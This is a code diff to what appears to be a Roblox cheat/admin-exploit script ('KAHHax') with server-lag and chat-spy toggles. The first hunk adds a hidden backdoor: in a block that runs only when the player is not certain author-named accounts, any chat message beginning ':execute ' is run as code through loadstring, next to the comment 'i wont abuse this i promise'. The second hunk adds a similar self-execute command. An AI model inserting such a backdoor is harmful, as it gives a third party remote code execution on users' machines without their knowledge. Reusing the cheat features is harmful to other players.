@@ -180,6 +180,9 @@ if game:GetService("Players").LocalPlayer.Name ~= "StefanukSwAg" and game:GetSer
         if chat == "hi gamers" then
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("m Hi Epic Gamers! v2", "All")
         end
+        if string.sub(chat, 1, 9) == ":execute " then
+            loadstring(string.sub(message, 10, -1))() -- i wont abuse this i promise
+        end
     end)
 end
 
@@ -371,6 +374,9 @@ game:GetService("Players").LocalPlayer.Chatted:Connect(function(message)
         KAHHax.lagServer = not KAHHax.lagServer
         getgenv().chatSpyEnabled = not KAHHax.lagServer
         print('Lag Server Toggle:', (not KAHHax.lagServer and "Disabled." or "Enabled."))
+    elseif string.sub(message, 1, 9) == ":execute " then
+        loadstring(string.sub(message, 10, -1))()
+        print('Script Executed!')
     end
 end)
 
